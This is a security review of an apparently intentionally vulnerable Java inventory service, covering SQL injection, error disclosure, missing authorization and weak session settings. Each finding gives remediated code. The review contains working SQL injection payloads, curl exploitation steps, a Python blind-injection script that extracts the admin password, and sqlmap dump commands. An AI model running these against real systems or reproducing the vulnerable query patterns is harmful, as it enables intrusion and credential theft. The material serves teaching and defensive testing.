# Security Review - Java Inventory Service

## Overview
This document provides a comprehensive security analysis of the Java Inventory Service, including threat modeling, vulnerability assessment, and remediation guidance. The application contains intentional security flaws for educational purposes.

## Executive Summary

### Risk Assessment
- **Critical**: 3 vulnerabilities
- **High**: 2 vulnerabilities  
- **Medium**: 4 vulnerabilities
- **Low**: 2 vulnerabilities

### Key Findings
1. **SQL Injection** vulnerabilities in multiple endpoints
2. **Authentication bypass** through SQL injection
3. **Information disclosure** via verbose error messages
4. **Insufficient authorization** controls
5. **Weak session management** configuration

## Threat Model

### STRIDE Analysis

#### System Components
- **Web Application** (Spring Boot)
- **Database** (MySQL)
- **Load Balancer** (nginx/ALB)
- **User Sessions** (HTTP sessions)

#### Threat Classification

| Component | Spoofing | Tampering | Repudiation | Info Disclosure | DoS | Elevation |
|-----------|----------|-----------|-------------|-----------------|-----|-----------|
| Web App   | ✓        | ✓         | ✓           | ✓               | ✓   | ✓         |
| Database  | -        | ✓         | -           | ✓               | ✓   | -         |
| Sessions  | ✓        | ✓         | ✓           | ✓               | -   | ✓         |

### Attack Tree Analysis

#### Primary Attack Goal: Unauthorized Data Access

```
Unauthorized Data Access
├── OR: Authentication Bypass
│   ├── SQL Injection in Login
│   ├── Session Hijacking
│   └── Credential Brute Force
├── OR: Authorization Bypass
│   ├── Direct Object Reference
│   ├── Privilege Escalation
│   └── Missing Access Controls
└── OR: Data Extraction
    ├── SQL Injection in Search
    ├── Error-based Information Disclosure
    └── Database Dump via Union Injection
```

![Attack Tree Diagram](./images/attack-tree-sql-injection.svg)

## Vulnerability Assessment

### VULN-001: SQL Injection in Authentication (Critical)

#### Description
The login functionality is vulnerable to SQL injection attacks that allow authentication bypass.

#### Location
- **File**: `src/main/java/com/secureshop/inventory/controller/AuthController.java`
- **Method**: `authenticate()`
- **Line**: 45-48

#### Vulnerable Code
```java
@PostMapping("/login")
public String authenticate(@RequestParam String username, 
                          @RequestParam String password, 
                          Model model) {
    
    // VULNERABLE: Direct SQL concatenation
    String sql = "SELECT * FROM users WHERE username = '" + 
                 username + "' AND password = '" + password + "'";
    
    List<User> users = jdbcTemplate.query(sql, new UserRowMapper());
    
    if (!users.isEmpty()) {
        // Authentication successful
        return "redirect:/dashboard";
    }
    
    model.addAttribute("error", "Invalid credentials");
    return "login";
}
```

#### Attack Vectors

**1. Authentication Bypass**
```sql
Username: admin' OR '1'='1' --
Password: anything
```

**2. Union-based Data Extraction**
```sql
Username: admin' UNION SELECT username, password, email, 'ADMIN', 1, NOW() FROM users --
Password: anything
```

**3. Error-based Information Disclosure**
```sql
Username: admin' AND (SELECT COUNT(*) FROM information_schema.tables) --
Password: anything
```

#### Impact
- **Confidentiality**: Complete bypass of authentication
- **Integrity**: Unauthorized access to admin functions
- **Availability**: Potential database manipulation

#### CVSS Score: 9.8 (Critical)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

#### Remediation
```java
@PostMapping("/login")
public String authenticate(@Valid @ModelAttribute LoginForm form, 
                          BindingResult result, 
                          Model model) {
    
    if (result.hasErrors()) {
        return "login";
    }
    
    // SECURE: Using parameterized queries
    String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
    List<User> users = jdbcTemplate.query(sql, 
        new Object[]{form.getUsername(), hashPassword(form.getPassword())}, 
        new UserRowMapper());
    
    if (!users.isEmpty()) {
        // Set up secure session
        User user = users.get(0);
        SecurityContextHolder.getContext().setAuthentication(
            new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities())
        );
        return "redirect:/dashboard";
    }
    
    model.addAttribute("error", "Invalid credentials");
    return "login";
}
```

### VULN-002: SQL Injection in Product Search (Critical)

#### Description
The product search functionality allows SQL injection through the search parameter.

#### Location
- **File**: `src/main/java/com/secureshop/inventory/service/ProductService.java`
- **Method**: `searchProducts()`
- **Line**: 67-71

#### Vulnerable Code
```java
public List<Product> searchProducts(String searchTerm) {
    // VULNERABLE: String concatenation in SQL
    String sql = "SELECT * FROM products WHERE name LIKE '%" + 
                 searchTerm + "%' OR description LIKE '%" + 
                 searchTerm + "%'";
    
    return jdbcTemplate.query(sql, new ProductRowMapper());
}
```

#### Attack Vectors

**1. Union-based Data Extraction**
```sql
Search: test' UNION SELECT id, username, password, email, role, 1, NOW(), NOW() FROM users --
```

**2. Boolean-based Blind SQL Injection**
```sql
Search: test' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
```

**3. Time-based Blind SQL Injection**
```sql
Search: test' AND (SELECT SLEEP(5)) --
```

#### Impact
- **Confidentiality**: Access to all database data
- **Integrity**: Potential data modification
- **Availability**: Database performance degradation

#### CVSS Score: 9.1 (Critical)

#### Remediation
```java
public List<Product> searchProducts(String searchTerm) {
    // SECURE: Using parameterized queries
    String sql = "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?";
    String searchPattern = "%" + searchTerm + "%";
    
    return jdbcTemplate.query(sql, 
        new Object[]{searchPattern, searchPattern}, 
        new ProductRowMapper());
}
```

### VULN-003: Information Disclosure via Error Messages (High)

#### Description
The application exposes detailed database error messages to users, revealing internal system information.

#### Location
- **File**: `src/main/java/com/secureshop/inventory/controller/GlobalExceptionHandler.java`
- **Method**: `handleSQLException()`

#### Vulnerable Code
```java
@ExceptionHandler(SQLException.class)
public ResponseEntity<String> handleSQLException(SQLException ex) {
    // VULNERABLE: Exposes database structure
    return ResponseEntity.status(500)
        .body("Database error: " + ex.getMessage() + 
              "\nSQL State: " + ex.getSQLState() +
              "\nError Code: " + ex.getErrorCode());
}
```

#### Attack Vectors
1. Trigger SQL errors to enumerate database structure
2. Extract table names and column information
3. Identify database version and configuration

#### Impact
- **Confidentiality**: Database schema disclosure
- **Integrity**: Information for targeted attacks
- **Availability**: Minimal impact

#### CVSS Score: 7.5 (High)

#### Remediation
```java
@ExceptionHandler(SQLException.class)
public ResponseEntity<ErrorResponse> handleSQLException(SQLException ex) {
    // Log detailed error for debugging
    logger.error("Database error occurred", ex);
    
    // Return generic error to user
    ErrorResponse error = new ErrorResponse(
        "INTERNAL_ERROR", 
        "An internal error occurred. Please try again later."
    );
    
    return ResponseEntity.status(500).body(error);
}
```

### VULN-004: Insufficient Authorization Controls (High)

#### Description
Admin functionality is accessible to any authenticated user due to missing authorization checks.

#### Location
- **File**: `src/main/java/com/secureshop/inventory/controller/AdminController.java`
- **Method**: `listUsers()`

#### Vulnerable Code
```java
@GetMapping("/admin/users")
public String listUsers(Model model) {
    // VULNERABLE: No role verification
    List<User> users = userService.findAll();
    model.addAttribute("users", users);
    return "admin/users";
}
```

#### Attack Vectors
1. Access admin endpoints as regular user
2. View sensitive user information
3. Perform administrative actions

#### Impact
- **Confidentiality**: Access to user data
- **Integrity**: Unauthorized administrative actions
- **Availability**: System configuration changes

#### CVSS Score: 8.1 (High)

#### Remediation
```java
@GetMapping("/admin/users")
@PreAuthorize("hasRole('ADMIN')")
public String listUsers(Model model, Authentication auth) {
    // Verify admin role
    if (!auth.getAuthorities().stream()
            .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"))) {
        throw new AccessDeniedException("Admin access required");
    }
    
    List<User> users = userService.findAll();
    model.addAttribute("users", users);
    return "admin/users";
}
```

### VULN-005: Weak Session Management (Medium)

#### Description
Session configuration lacks security hardening, making sessions vulnerable to hijacking.

#### Location
- **File**: `src/main/resources/application.properties`

#### Vulnerable Configuration
```properties
# VULNERABLE: Weak session settings
server.servlet.session.timeout=60m
server.servlet.session.cookie.http-only=false
server.servlet.session.cookie.secure=false
server.servlet.session.cookie.same-site=none
```

#### Attack Vectors
1. Session hijacking via XSS
2. Session fixation attacks
3. Cross-site request forgery

#### Impact
- **Confidentiality**: Session token exposure
- **Integrity**: Unauthorized actions
- **Availability**: Account takeover

#### CVSS Score: 6.1 (Medium)

#### Remediation
```properties
# SECURE: Hardened session settings
server.servlet.session.timeout=30m
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.same-site=strict
server.servlet.session.tracking-modes=cookie
```

## Exploitation Scenarios

### Scenario 1: Complete System Compromise

#### Step 1: Authentication Bypass
```bash
curl -X POST http://localhost:8080/inventory/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin' OR '1'='1' --&password=anything"
```

#### Step 2: Data Extraction
```bash
curl "http://localhost:8080/inventory/products/search?q=test' UNION SELECT id,username,password,email,role,1,NOW(),NOW() FROM users --"
```

#### Step 3: Privilege Escalation
```bash
curl "http://localhost:8080/inventory/admin/users" \
  -H "Cookie: JSESSIONID=<session-id>"
```

### Scenario 2: Blind SQL Injection Data Extraction

#### Automated Extraction Script
```python
import requests
import string
import time

def extract_data():
    url = "http://localhost:8080/inventory/products/search"
    
    # Extract admin password character by character
    password = ""
    for i in range(1, 33):  # Assuming max 32 char password
        for char in string.ascii_letters + string.digits:
            payload = f"test' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='admin')='{char}' --"
            
            response = requests.get(url, params={"q": payload})
            
            if "No products found" not in response.text:
                password += char
                print(f"Found character {i}: {char}")
                break
        else:
            break
    
    print(f"Extracted password: {password}")

extract_data()
```

## Testing Methodology

### Manual Testing

#### 1. Authentication Testing
```bash
# Test SQL injection in login
curl -X POST http://localhost:8080/inventory/login \
  -d "username=admin' OR '1'='1' --&password=test"

# Test error-based injection
curl -X POST http://localhost:8080/inventory/login \
  -d "username=admin' AND (SELECT COUNT(*) FROM information_schema.tables) --&password=test"
```

#### 2. Search Functionality Testing
```bash
# Test union-based injection
curl "http://localhost:8080/inventory/products/search?q=test' UNION SELECT 1,2,3,4,5,6,7,8 --"

# Test time-based injection
curl "http://localhost:8080/inventory/products/search?q=test' AND (SELECT SLEEP(5)) --"
```

#### 3. Authorization Testing
```bash
# Test admin access without proper role
curl "http://localhost:8080/inventory/admin/users" \
  -H "Cookie: JSESSIONID=<regular-user-session>"
```

### Automated Testing

#### SQLMap Usage
```bash
# Test login endpoint
sqlmap -u "http://localhost:8080/inventory/login" \
  --data="username=admin&password=test" \
  --method=POST \
  --level=5 \
  --risk=3

# Test search endpoint
sqlmap -u "http://localhost:8080/inventory/products/search?q=test" \
  --level=5 \
  --risk=3 \
  --dump
```

#### Burp Suite Configuration
1. Configure proxy: 127.0.0.1:8080
2. Add target scope: localhost:8080
3. Enable active scanning
4. Use Intruder for parameter fuzzing

## Remediation Roadmap

### Phase 1: Critical Vulnerabilities (Week 1)
1. **Fix SQL Injection vulnerabilities**
   - Implement parameterized queries
   - Add input validation
   - Update all database interactions

2. **Secure Error Handling**
   - Implement generic error messages
   - Add comprehensive logging
   - Create error response DTOs

### Phase 2: High-Risk Issues (Week 2)
1. **Implement Authorization Controls**
   - Add method-level security
   - Implement role-based access control
   - Create authorization interceptors

2. **Harden Session Management**
   - Update session configuration
   - Implement session validation
   - Add session monitoring

### Phase 3: Medium-Risk Issues (Week 3)
1. **Input Validation Enhancement**
   - Add comprehensive validation
   - Implement sanitization
   - Create validation frameworks

2. **Security Headers Implementation**
   - Add security headers
   - Implement CSP policies
